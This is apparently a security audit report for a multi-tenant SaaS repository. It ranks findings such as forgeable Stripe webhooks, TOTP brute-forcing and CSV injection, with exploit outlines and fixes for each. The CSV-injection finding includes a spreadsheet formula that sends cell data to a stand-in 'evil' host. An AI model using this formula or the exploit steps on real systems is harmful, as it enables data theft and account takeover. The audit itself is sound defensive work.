# Security audit — whole repository (2026-10-22)

Read-only review of `backend/`, `frontend/`, `deploy/` and `.github/` (~38k lines). No code was changed during the audit.

**Verification:** every finding was traced through the code end to end. Items marked **✔** were additionally re-checked by hand by the lead reviewer. "Plausible" means the code path exists but exploitability depends on deployment details.

**Summary:** no SQL injection, no reachable cross-tenant IDOR, no XSS sinks and no committed secrets were found. The serious issues are in billing webhooks, MFA throttling, realtime rate limiting, account linking, and deploy configuration.

| Severity | Count |
|---|---|
| Critical | 1 |
| High | 2 |
| Medium | 15 |
| Low | 30 |
| Info | 17 |

Suggested fix order: C-1, H-1, H-2, M-1, M-11, M-15, then the remaining Medium items.

---

## Critical

### C-1 ✔ Stripe webhooks can be forged (free plans, reactivation, cancelling other tenants)
- **Where:** `backend/packages/services/src/bootstrap.ts:69-72`, `backend/packages/services/src/billing.ts:68-71` and `:125-127`, `backend/packages/config/src/index.ts:66-73`, `deploy/.env.example:30-32`, `deploy/docker-compose.yml:41-42`
- **What's wrong:** two paths, neither blocked in production:
  - **(a) Billing not configured.** When `STRIPE_SECRET_KEY` is empty or ends in `placeholder`, the runtime builds `FakeBillingProvider` signed with `STRIPE_WEBHOOK_SECRET || 'whsec_local'`. The deploy template says "Leave empty to run without billing" and compose defaults both values to empty, so a production install without billing accepts webhooks HMAC-signed with the public string `whsec_local`. The fake verifier also has no timestamp tolerance and compares with `!==` (not timing-safe).
  - **(b) Stripe key set, webhook secret empty.** `stripe.webhooks.constructEvent(raw, sig, '')` is called; stripe-node 18.5.0 `verifyHeader` does not reject an empty secret, so an HMAC with an empty key is accepted.
  - `loadEnv` checks neither case.
- **Exploit:**
  1. `POST https://api.<domain>/webhooks/stripe` with a raw JSON body and `stripe-signature: t=<now>,v1=HMAC(secret, "<t>.<body>")`.
  2. `receiveBillingWebhook` stores the event and `processBillingEvent` (`billing.ts:233`) processes the cached copy without re-fetching it from Stripe.
  3. With `data.object.metadata.tenantId` set to the attacker's tenant: `customer.subscription.updated` with the predictable seeded price `price_seed_pro_month_sar` (`reference-data.ts:24`) gives a free Pro plan; `invoice.paid` moves trial / expired / cancelled / billing-suspended tenants to active.
  4. `customer.subscription.deleted` with another tenant's ID would cancel that tenant (exposure of tenant UUIDs not verified).
- **Fix:**
  - In production, refuse to start if `STRIPE_SECRET_KEY` is set and `STRIPE_WEBHOOK_SECRET` is empty.
  - Never build `FakeBillingProvider` when `APP_ENV` is `production` or `staging`; with no billing configured, return 404 from `/webhooks/stripe`.
  - Use `timingSafeEqual` and a 300 s tolerance in the fake provider.
  - Optionally re-fetch events from Stripe (`retrieveEvent`) instead of trusting the payload.

---

## High

### H-1 ✔ Sign-in TOTP step can be brute-forced (worst on the platform console)
- **Where:** `backend/packages/services/src/auth.ts:85-98` (`signInUserMfa`), `:430-442` (`signInPlatformMfa`), `backend/packages/auth/src/totp.ts:4`, `backend/apps/api/src/routes/auth.ts:46`
- **What's wrong:**
  - Neither function calls `checkThrottle`.
  - `recordFailure` writes to keys (`userId` / `p:${u.id}`) that are never read, because `checkThrottle` keys on the email.
  - The `mfaToken` lives 5 minutes, survives failed codes and is not bound to IP or user agent.
  - The only limit is the `signin` route limiter: 30 requests per 15 minutes per IP. With `window: 1`, each guess has ~3-in-1,000,000 odds.
- **Exploit:** with a phished or reused password, spread guesses across many IPs (~1,000 IPs ≈ 9% success per 15 minutes), minting fresh `mfaToken`s by repeating the password step. Defeats mandatory MFA for super admins.
- **Fix:** per-account MFA failure counter checked in both functions (lock after 5–10 failures); delete the `mfaToken` after N failures; optionally bind it to IP and user agent.

### H-2 Realtime handshake limit is keyed on the proxy's IP — one client can cut off realtime for everyone
- **Where:** `backend/apps/realtime/src/server.ts:66-71`
- **What's wrong:** 30 handshakes/minute keyed on `socket.handshake.address` (engine.io `remoteAddress`). In the VPS deploy every client arrives through Caddy (`/rt/*` → `realtime:4001`), so all users share one key per container. `X-Forwarded-For` is never used. The counter increments before authentication.
- **Exploit:** an unauthenticated attacker sends ~31 socket.io CONNECTs per minute to `/rt/`. Every customer page, staff board and display gets `RATE_LIMITED` and "order ready" alerts stop. Normal traffic above 30 connects/minute (page loads, reconnect loops) triggers it on its own.
- **Fix:** key on the client IP from `X-Forwarded-For`, trusting only Caddy's address; use a shared Redis limiter; prune the `handshakes` and `perClient` maps, which currently grow without bound.

---

## Medium

### M-1 ✔ Pre-account takeover through Google sign-in
- **Where:** `backend/packages/services/src/account.ts:139-147`
- **What's wrong:** `finishOidc` links a Google identity to any existing user with that email without checking `email_verified_at`, and does not clear the existing password or sessions. Sign-up does not require email verification.
- **Exploit:** attacker signs up as `victim@corp.com` with a password → victim later signs in with Google and lands in the same account → attacker keeps password access to everything the victim creates or is invited to.
- **Fix:** when the existing account is unverified, refuse the link, or wipe `password_hash`, TOTP and sessions before linking.

### M-2 No throttle on `/mfa/refresh` — fresh-MFA gate can be brute-forced
- **Where:** `backend/apps/api/src/routes/auth.ts:277-286`, `backend/packages/services/src/auth.ts:461-466`
- **What's wrong:** no rate limit and no failure counter; guessing requests also keep the 30-minute idle session alive.
- **Exploit:** with a stolen `psid` cookie, ~300k codes in tens of minutes unlocks delete tenant, reset another admin's MFA, ownership transfer and emergency support.
- **Fix:** rate-limit per platform user and revoke the session after N failures.

### M-3 Invitation tokens are written to request logs in plaintext
- **Where:** `backend/apps/api/src/app.ts:58` (only `/tickets/` tokens are masked); routes `GET`/`POST /api/auth/v1/invitations/:token` and `POST /platform-invitations/:token/accept` (`routes/auth.ts:194, 206, 289`)
- **Exploit:** anyone with log access (log shipper, Sentry, ops) takes an unaccepted platform-user invite token, sets the password, then enrols their own TOTP via `/sign-in/mfa/enroll` (enrolment only needs the password) → super-admin account. Same for owner invites to platform-created tenants.
- **Fix:** move tokens into the request body and/or mask `/invitations/…` paths in the log serializer.

### M-4 Removing or replacing TOTP needs no re-authentication
- **Where:** `backend/apps/api/src/routes/auth.ts:251-276`, `backend/packages/services/src/auth.ts:247-267`
- **What's wrong:** a session plus CSRF token is enough; re-enrolling overwrites the existing secret.
- **Exploit:** with a stolen `sid`, the attacker removes or replaces the victim's TOTP; `confirmTotp`/`removeTotp` then revoke the victim's other sessions, leaving the attacker in sole control.
- **Fix:** require the password and/or a current TOTP code for enrol (when already enrolled), confirm-replace and delete.

### M-5 Login lockout is per email *and* IP together
- **Where:** `backend/packages/services/src/auth.ts:30-37`
- **What's wrong:** the counter is `signin:acct:${email}:${ip}`; there is no per-account counter.
- **Exploit:** password spraying / brute force against one account from many IPs is unlimited.
- **Fix:** add a per-account counter (soft delays or CAPTCHA to limit lockout abuse) alongside the per-IP one.

### M-6 Accepting an invitation skips MFA for users who have it
- **Where:** `backend/packages/services/src/auth.ts:368-391`
- **What's wrong:** an existing user with TOTP gets a session with `mfa=false` after giving only the password, contradicting the code's own rule (A03) that MFA applies to every sign-in path.
- **Exploit:** chained with M-4, password + invitation token lets an attacker enrol their own TOTP and take the account across all tenants.
- **Fix:** if `totp_secret_enc` is set, return `issueUserMfaChallenge` instead of creating a session.

### M-7 Client IP may be spoofable (plausible)
- **Where:** `backend/packages/config/src/index.ts:53` (`TRUST_PROXY` defaults to `true`), `backend/apps/api/src/app.ts:49` (`trust proxy = true` takes the leftmost `X-Forwarded-For`), `backend/apps/api/src/http/middleware.ts:47` (trusts `X-Forwarded-Host`), `deploy/Caddyfile` (`trusted_proxies static private_ranges`)
- **What's wrong:** the shipped Caddy setup overwrites these headers for untrusted clients, so the default path is OK. But Caddy trusts all private ranges: if traffic reaches Caddy through Docker's userland `docker-proxy` (e.g. IPv6 clients — `deploy/.env.example` recommends AAAA records — to an IPv4-only container, where the source becomes 172.x), or the API is ever exposed directly, forged `X-Forwarded-For` bypasses every per-IP limit (sign-in, MFA, reset, pairing, staff PIN).
- **Fix:** default `TRUST_PROXY` to false; set Express `trust proxy` to an explicit hop count or Caddy's subnet; narrow Caddy's `trusted_proxies`.

### M-8 CSV / formula injection in tenant data export and CSV report
- **Where:** `backend/packages/services/src/privacy.ts:198-206` (`csv()` used by `buildExport`), `backend/packages/services/src/r2.ts:238-241` (`cell()` used by `ticketsCsv`)
- **What's wrong:** cells are only quoted for `" , \n`. Leading `= + - @`, tab or CR are not neutralised; a lone `\r` is not quoted. Attacker-controlled sources: `ratings.comment` from **anonymous customers** (`POST /api/public/v1/tickets/:token/rating`, ≤1000 chars); `tickets.note` / `external_ref` from staff, API key and POS; `audit_activity.csv` `entity_id` from API callers (`integration.ts:109`).
- **Exploit:** a customer rates with `=HYPERLINK("https://evil/?x="&C2,"Open")` (or DDE); the owner opens ratings.csv/tickets.csv in Excel and the formula runs or exfiltrates neighbouring cells.
- **Fix:** one shared CSV encoder: prefix `'` when a cell starts with `[=+\-@\t\r]`, and quote any cell containing `\r`.

### M-9 Managers and support sessions can create venues, raising the Stripe subscription quantity
- **Where:** `backend/apps/api/src/routes/admin-r2.ts:39` (`POST /venues`, `permission: 'venue.settings'`, `tenant(c)` accepts support actors); `backend/packages/services/src/r2.ts:96-117` (`createVenue` → `syncQuantity` → `setQuantity(..., create_prorations)`); `backend/packages/auth/src/permissions.ts:52,57`
- **What's wrong:** `venue.settings` is granted to MANAGER and SUPPORT_SESSION. Archiving correctly requires `billing.manage`; creating does not. TR-AUTH-10 says support sessions cannot change billing.
- **Fix:** require `billing.manage` and a `user` actor for venue creation, same as archive.

### M-10 Realtime socket skips the MFA rule the API enforces
- **Where:** `backend/apps/realtime/src/server.ts:88-98` vs `backend/apps/api/src/http/router.ts:122`
- **What's wrong:** the API refuses `/api/staff/*` to users without verified MFA in multi-venue tenants (`mfaRequiredFor`); the socket accepts any active membership plus a session with no `mfaVerified` or tenant-status check.
- **Exploit:** with a stolen password for an un-enrolled owner/manager in a multi-venue tenant, the API blocks them but `/rt/` with `auth.venueId` streams the live staff board (tickets, claims, settings). Read-only impact.
- **Fix:** apply the same `mfaRequiredFor`/`mfaVerified` and tenant-access status checks in the socket middleware.

### M-11 ✔ MinIO S3 API publicly exposed; app uses MinIO root credentials
- **Where:** `deploy/Caddyfile` (`@files host files.{$DOMAIN}` → `reverse_proxy minio:9000`), `deploy/docker-compose.yml` (`S3_ACCESS_KEY: ${MINIO_ROOT_USER}`, `S3_SECRET_KEY: ${MINIO_ROOT_PASSWORD}`)
- **What's wrong:** the entire S3 API (all methods, all buckets, admin endpoints) is reachable from the internet, and the API/realtime/worker containers hold the MinIO *root* credentials — contradicting the compose comment that admin passwords stay out of app containers. A compromise of any app container, or a leaked root password, gives full control of all stored files and exports, and the public endpoint allows credential guessing.
- **Fix:** create a dedicated MinIO user with a policy limited to the two buckets (no admin); in Caddy allow only `GET`/`HEAD` to `files.<domain>` (assets bucket and presigned export URLs) and reject everything else.

### M-12 Outgoing webhooks: no per-tenant limits, shared queue can be starved
- **Where:** `backend/apps/api/src/routes/admin-r2.ts:79-118`, `backend/packages/services/src/webhooks.ts:61,241`, `backend/apps/worker/src/processor.ts:252`
- **What's wrong:** no cap on endpoints per tenant; `/webhooks/:id/test` and `/redeliver` are not rate-limited; the webhooks queue has no fairness (`FAIR` covers only push and email); each delivery can hold a worker slot for 10 s (20 slots per worker).
- **Exploit:** a tenant creates many endpoints pointing at a slow tarpit host and loops the test call, delaying every other tenant's deliveries and using the platform as a signed-POST source against third parties.
- **Fix:** cap endpoints per tenant, rate-limit test/redeliver per actor, add per-tenant token-bucket fairness to `webhook.deliver`.

### M-13 Support session can be turned into 30-day staff-device access (Low–Medium)
- **Where:** `backend/apps/api/src/routes/admin.ts:277-306` (staff-access GET, rotate-link, PUT pin — all `venue.staff_access`, which support has), `backend/packages/services/src/venues.ts:215-222` (returns the decrypted staff link), `:269-320` (`staffSignIn` issues a 30-day sliding device session)
- **Exploit:** during a support session, the agent reads the staff link and sets a new venue PIN, then signs in a staff board that keeps working after the support session ends. It is audited and kicks existing devices, so it is visible.
- **Fix:** remove `venue.staff_access` writes and link reveal from SUPPORT_SESSION, or bind devices created during support to the support session's expiry.

### M-14 Off-site backups can be deleted from the VPS
- **Where:** `deploy/backup/*.sh`, `deploy/backup/rclone.conf.example`
- **What's wrong:** the backup container holds rclone credentials with delete rights (`rclone delete`, `rclone sync`), so anyone who compromises the VPS (or ransomware) can wipe the off-site copies as well as the primary data. `files.sh` uses `sync`, which propagates deletions/overwrites.
- **Fix:** use a write-only/append-only key and bucket object lock or versioning (B2/R2/Wasabi support this); run retention pruning from a separate, trusted location.

### M-15 ✔ Local staff session file is not gitignored
- **Where:** `frontend/e2e/.auth/staff.json` (written by `frontend/e2e/support.ts:46-62`); root `.gitignore` pattern `e2e/.auth/`
- **What's wrong:** a pattern containing a slash only matches relative to the `.gitignore` location, so `frontend/e2e/.auth/` is not ignored and the file shows as untracked. It holds a Playwright storageState with a live httpOnly `dop_dev` staff-device cookie for `burger-house.dop.localhost` (seeded local tenant, expires 2026-11-21). Not in git history yet.
- **Risk:** today it is local-dev only, but if e2e runs against staging (`E2E_DOMAIN` supports this) a real staging device cookie would be committed.
- **Fix:** change the pattern to `**/e2e/.auth/` (or add `frontend/e2e/.auth/`) and delete the file.

---

## Low

### Authentication & sessions
- **L-1 TOTP codes can be replayed.** `backend/packages/auth/src/totp.ts` stores no last-used time step; a code captured by a real-time phishing proxy is reusable for ~60–90 s, including in parallel. *Fix:* store the last accepted step per user and reject codes at or before it.
- **L-2 Single-use tokens can be used twice under concurrency.** `useEmailToken` (`services/auth.ts:199-205`) does select-then-update without `AND used_at IS NULL`; handoff, MFA token and support handoff do get-then-del (`auth.ts:293-295`, `support.ts:171-172`). *Fix:* conditional update checking affected rows, or Redis `GETDEL`.
- **L-3 Breached-password list is never shipped.** `backend/packages/auth/src/passwords.ts:19` references `data/breached-passwords.txt` and `tools/fetch-breached-list.mjs`, which don't exist, and the path wouldn't resolve from `dist`. Only 20 built-in passwords are blocked. *Fix:* add the fetch step to the build and resolve the path correctly.
- **L-4 Staff PIN lockout is partly client-controlled; venue lock is a DoS lever.** `backend/apps/api/src/routes/staff.ts:66`, `backend/packages/services/src/venues.ts:278-281` key the per-device lockout on the client-set `dop_fp` cookie, so rotating it skips the 5-try limit. The per-IP limit (20/10 min) and venue-wide lock (20 failures/hour → 15 min + owner email) still hold, but anyone with the staff link can lock the whole venue repeatedly. *Fix:* key on IP or a server-issued fingerprint.
- **L-5 Support access survives disabling the platform user.** `services/support.ts:186-198` (`resolveSupport`) never checks `platform_users.status`; `services/console.ts:220` only revokes `platform_sessions`. *Fix:* check status in `resolveSupport` and end the user's support sessions on disable.
- **L-6 Destructive console actions lack fresh MFA.** `console.ts:199-218` (invite platform user incl. `super_admin`, role/status change), `console.ts:153` (cancel tenant), `console.ts:234` (`PUT /settings`, maintenance mode), `console-r11.ts` (plans, coupons, free months, feature flags, email templates). A stolen session past the 15-minute window can invite a new super admin. *Fix:* `requireFreshMfa` on these routes, at least platform-user management.
- **L-7 Display session expiry not enforced server-side.** `displaySlidingMs` is never checked in `venues.ts` `resolveDisplay`.
- **L-8 `/sign-out` is CSRF-exempt** and needs no body, so a same-site page can log users out.
- **L-9 Production guards depend on `APP_ENV=production`.** The config default is `local`; compose sets `production` by default, but nothing rejects the dev `SESSION_PEPPER` from `backend/.env.example` or the dev `LOCAL_DATA_KEY` value if `APP_ENV` is wrong. *Fix:* fail closed when `NODE_ENV=production`, and reject known dev values.

### Authorization & business logic
- **L-10 Read permission gates destructive writes.** `DELETE /api/admin/v1/ratings/:id` (`admin.ts:264-274`) uses `reports.view` (managers and support can erase customer comments); `PATCH /api/admin/v1/tenant` (`admin.ts:102-111`) uses `venue.settings` (managers and support can change `billing_email`, `tax_id` — `tenant-admin.ts:17-35`). *Fix:* `team.manage` / `billing.manage`, exclude support.
- **L-11 `TenantScopePlugin` doesn't scope `ON DUPLICATE KEY UPDATE` (latent).** `backend/packages/db/src/tenant-scope.ts:244-262` only checks the INSERT's tenant_id. `connectors.ts:77-90` `savePosConnection` upserts `pos_connections` on `uq_provider_location (provider, external_location_id)` — tenant B saving tenant A's location ID would overwrite A's `credentials_enc`/`status`. Not reachable today (no callers). *Fix:* reject `onDuplicateKey` on tenant tables or include `tenant_id` in every unique key.
- **L-12 Plan-limit TOCTOU races.** Count-then-insert without locks in `createVenue` (`r2.ts:98-99`), `createCounter` (`venue-features.ts:28-29`), `createDisplay` (`venues.ts:372-373`), staff device limit (`venues.ts:301-302`), API keys (`integration.ts:20-21`). The trial daily counter rebuild (`tickets.ts:195-207`) overwrites a concurrent INCR and counts per venue while the key is per tenant. *Fix:* `SELECT … FOR UPDATE` on the tenant/venue row before counting.
- **L-13 Claim abuse / DoS (plausible).** Per-venue claim limit of 100/10 min (`routes/public.ts:183`) lets ~10 IPs block all real claims. In approval mode anyone with the public venue code can flood the board (`venue-features.ts:114-125`); a mistaken approval gives the attacker the token, letting them acknowledge the ticket and stop re-alerts to the real customer. *Fix:* per-clientId limits and a cap on pending requests per ticket.

### Privacy & retention
- **L-14 Retention and erasure gaps.** `push_subscriptions` (endpoint, p256dh, auth, client_id) are never deleted — not by retention (`alerts.ts:321-331`) nor tenant purge (table has no tenant). `retentionTickets` (`alerts.ts:293-318`) leaves `alert_attempts`/`alert_deliveries` rows for deleted tickets. In the purge job (`apps/worker/src/handlers.ts:83`) a failed Stripe `deleteCustomer` is only logged, then `stripe_customer_id` is removed — the customer and any live subscription survive with no retry. *Fix:* delete orphaned/revoked subscriptions, add alert tables to retention, retry/fail purge on Stripe errors.

### Outbound requests & integrations
- **L-15 Push endpoint allowlist too broad.** `backend/packages/domain/src/alert.ts:28-43` accepts any `*.googleapis.com` / `*.mozilla.com` host on any port; this is the only SSRF guard for push (`routes/public.ts:99-101`). A customer can make the worker POST to e.g. `storage.googleapis.com/attacker-bucket/x`. *Fix:* pin `fcm.googleapis.com`, `updates.push.services.mozilla.com`, `*.push.apple.com`, `*.notify.windows.com`, port 443 only.
- **L-16 Webhook SSRF blocklist gaps (plausible).** `webhooks.ts:24-32` misses `64:ff9b::/96`, `::a.b.c.d`, `2002::/16`, `198.18.0.0/15`, `192.0.0.0/24`, `fec0::/10`. Matters only with NAT64-style routing. *Fix:* use `ipaddr.js` and require `range() === 'unicast'`.
- **L-17 Foodics webhook has no replay protection (plausible).** `connectors.ts:60-64` HMACs the body only — no timestamp or event-ID dedupe. *Fix:* dedupe on event ID and/or require a signed timestamp.
- **L-18 Outbox rows retry forever.** `outbox.ts:139,169-181` has no max attempts or dead-letter; poison rows occupy the 500-row relay batch indefinitely.
- **L-19 Unbounded in-memory maps in realtime.** `handshakes` and `perClient` in `apps/realtime/src/server.ts` are never pruned (memory growth over time).

### Frontend
- **L-20 Production CSP blocks the customer app's inline script.** `frontend/apps/web-customer/index.html:11-24` vs `deploy/Caddyfile:20` (`script-src 'self'`): the per-ticket manifest and preload never load in production. Risk is a "fix" adding `'unsafe-inline'`. *Fix:* move the snippet to an external file or add a `sha256-` hash. (Also: `LegalPage.tsx:14` `fetch` to `files.<domain>` is blocked by `connect-src`.)
- **L-21 Source maps publicly downloadable.** Every `vite.config.ts` uses `sourcemap: 'hidden'`; `deploy/web.Dockerfile` copies the full `dist`, so `/assets/*.js.map` is served. *Fix:* delete `*.map` before the Caddy stage, or 404 them in Caddy.
- **L-22 `files` is not a reserved slug.** `backend/packages/domain/src/rules.ts:58` — a tenant can claim `files.<domain>`, which Caddy routes to MinIO, so that tenant gets a broken host. *Fix:* add `files` to `RESERVED_SLUGS`.

### Deploy & CI
- **L-23 ✔ Downloaded binaries not checksum-verified.** `deploy/backup/Dockerfile` fetches rclone and mc with `curl`; `deploy/scripts/server-setup.sh` pipes `get.docker.com` to `sh`. *Fix:* verify SHA-256 sums (or use distro/vendor packages).
- **L-24 ✔ GitHub Actions pinned to tags, not commit SHAs.** `.github/workflows/*.yml` (`appleboy/scp-action@v0.1.7`, `appleboy/ssh-action@v1.2.0`, `aquasecurity/trivy-action@0.28.0`, `docker/*`, `actions/*`). A moved tag runs attacker code with `VPS_SSH_KEY` and `packages: write`. *Fix:* pin to full SHAs (Dependabot can keep them updated).
- **L-25 ✔ SSH deploy doesn't verify the host key.** `deploy.yml` `scp-action`/`ssh-action` have no `fingerprint`, allowing MITM of the deploy connection. *Fix:* set `fingerprint` from a secret.
- **L-26 ✔ Deploy workflow permissions broader than needed.** `packages: write` is set workflow-wide, so the `vps` job has it too; `workflow_dispatch` deploys any ref. *Fix:* scope permissions per job and require reviewers on the `production` environment (as the comment suggests).
- **L-27 ✔ Redis has no authentication.** `deploy/docker-compose.yml` — internal network only, but any compromised container can read sessions/MFA tokens or tamper with queues. *Fix:* `requirepass`/ACLs.
- **L-28 ✔ Local docker-compose exposes services on all interfaces with default passwords.** `backend/docker-compose.yml` publishes MySQL (`root`/`root`), Redis (no auth), MinIO (`minio`/`minio12345`) and Mailpit on `0.0.0.0`; reachable from the LAN on a developer machine. *Fix:* bind to `127.0.0.1:` and pin image tags (`mailpit:latest`, `minio:latest`).
- **L-29 ✔ Root DB password on command lines.** MySQL healthcheck (`-p${MYSQL_ROOT_PASSWORD}`) and backup scripts pass it via `-p`, visible in process listings. *Fix:* use `MYSQL_PWD` or an option file.
- **L-30 ✔ MinIO root credentials in the backup container.** Only read access to the assets bucket is needed. *Fix:* a read-only MinIO user for backups.

---

## Informational
- **I-1** `frontend/e2e/support.ts:13-15` hardcodes dev credentials (`dev-password-123`, PIN `4821`); ensure these seeds never reach staging/prod.
- **I-2** `seedDemo` uses `SEED_PASSWORD 'dev-password-123'` and fixed TOTP secrets for `super@dop.localhost`. Gated (skipped when `APP_ENV=production`, not in the build or `entry.mjs` roles), but a seeded staging/dev instance exposed to the internet has a known super-admin password and TOTP.
- **I-3** Socket Origin check (`apps/realtime/src/main.ts:265-273`) allows every `*.<domain>`, including `files.<domain>` and all tenant hosts. If HTML could ever be served from one of them, cross-site WebSocket hijack of staff/display sockets is possible (cookies are same-site). Limit to app hosts.
- **I-4** Tenant-controlled `tenantName` goes into invitation emails to arbitrary addresses. HTML-escaped, so text-phishing only.
- **I-5** POS OAuth isn't wired up (`savePosConnection`, `exchange` have no callers); review its `state` handling when implemented.
- **I-6** `X-Purpose` header is a self-declared audit label, not a control; support-session and notes routes don't ask for it.
- **I-7** Emergency-access `confirm` field is accepted but never checked (`console-r11.ts:79`).
- **I-8** Support handoff is not bound to the agent's user agent (the user handoff is).
- **I-9** Console support handoff (`web-console/.../SupportTab.tsx:47-48`): `window.open(..., 'noopener,noreferrer')` always returns `null`, so the one-time URL stays on screen and a second click reuses a spent code.
- **I-10** `scopedSql` guard (`db/src/client.ts:71-79`) passes if `tenantId` appears anywhere in the values and one predicate covers all tables. No current callers.
- **I-11** ESLint raw-SQL rule (`tools/eslint-rules/index.js:46`) is bypassed by any SQL containing the word `ps`.
- **I-12** API key prefix has only 4 random chars but is globally UNIQUE (`integration.ts:25`); collisions at a few thousand keys make creation fail (availability).
- **I-13** Plan-change price lookup ignores currency (`platform-tools.ts:218-224`).
- **I-14** Display counter IDs aren't validated against the venue (`venues.ts:368-414`); no leak because the query is tenant/venue-scoped.
- **I-15** Initial staff PIN uses `Math.random` (`venues.ts:73`); shown once and meant to be replaced.
- **I-16** Tenant export is built entirely in memory (`privacy.ts:209-240`); 90 days of data could exhaust worker memory.
- **I-17** Frontend dev servers use `host: true` (LAN-exposed in development only).

---

## Checked and correct

**Auth & HTTP**
- Cookies: `__Host-` prefix, HttpOnly, Secure, SameSite=Lax, host-only, path `/`; production refuses `INSECURE_COOKIES`.
- CSRF: synchroniser token (HMAC of session ID), constant-time compare on all state-changing cookie routes; exempt routes need JSON bodies; no CORS headers (same-origin only).
- Security headers: Helmet CSP `default-src 'none'` on the API; Caddy CSP with `frame-ancestors 'none'`, HSTS preload, nosniff, COOP, Permissions-Policy.
- Tokens: 32 bytes from `randomBytes`, stored only as HMAC-SHA256 with the pepper; codes from `crypto.randomInt`.
- Sessions: new token on every login, bound to host and tenant, idle + absolute timeouts, revoked on password/MFA change, ownership transfer, member removal.
- No account enumeration (dummy argon2 verify, uniform errors, forgot-password always 202). Passwords: argon2id m=19 MiB, t=2, p=1.
- Email links: reset 1 h, verify 24 h, invite 7 days; single-use and tenant-checked.
- Platform users require completed MFA; role/status re-read every request; self-demotion blocked. Emergency access is super-admin-only with fresh MFA and owner notification.
- RFC 9457 errors without stack traces; Express 5 async error handling.
- No open redirects; OAuth uses state, nonce and PKCE stored server-side. `/internal/*` blocked at Caddy.

**Data & tenant isolation**
- Tenant scope plugin covers SELECT/UPDATE/DELETE/JOIN/sub-queries and INSERT tenant checks, wrapping WHERE so `OR` can't escape; composite `(tenant_id, venue_id)` FKs; nightly integrity check.
- Every tenant route derives tenantId from the actor and checks venue ownership.
- All SQL parameterised; dynamic identifiers only from constants; LIKE input escaped.
- Strict Zod request schemas with explicit patches — no mass assignment.
- Logo upload: magic-byte sniffing, 2 MB / 4096 px limits, re-encoded PNG/WebP, random keys, no SVG.
- Exports: 15-minute presigned URL for one key, 7-day bucket expiry, `staff_key_enc` excluded.
- Ticket tokens 128-bit CSPRNG; no customer phone/PII columns.

**Realtime, jobs, integrations**
- Socket rooms derived only from server-side auth; customers join only rooms for valid tokens; public vs staff projections separated.
- Outgoing webhooks: https only, ports 443/8443, DNS check with connection pinned to the checked IP (blocks rebinding), no redirects, 10 s timeout, bounded retries, auto-disable; HMAC over `t.body` with dual secrets during rotation.
- Webhook secrets and POS credentials encrypted at rest and never returned; API keys stored hashed.
- Foodics signature uses timing-safe compare; real Stripe path uses `constructEvent` (300 s tolerance) with event dedupe.
- Job payloads Zod-validated; handlers re-read state; bounded BullMQ retries.
- Email rendering escapes everything; recipient validated; Nodemailer neutralises header CRLF.

**Frontend**
- Staff PIN / named-staff lock enforced server-side; member token in memory only.
- No `dangerouslySetInnerHTML`, `innerHTML`, `eval`, markdown or iframes; tenant URLs restricted to `https://`; brand colour validated as hex.
- No auth tokens in web storage; CSRF token in memory; `#mfa=` fragment cleared after reading.
- No Referer leaks (`no-referrer` on customer host and ticket API).
- Service worker precaches only the app shell; push payloads rendered as plain text.
- No `VITE_*` secrets in bundles; all `target=_blank` links use `noopener`/`noreferrer`.

**Infrastructure**
- Distroless, non-root backend image; Trivy scan in CI; CodeQL; `npm audit` gate.
- App DB user has data-only grants; migrations run as root in a one-shot container.
- Firewall limited to 22/80/443; unattended upgrades; fail2ban.
- Backups encrypted with rclone crypt; data key as a Docker secret; `.env` files and `deploy/secrets/` gitignored.
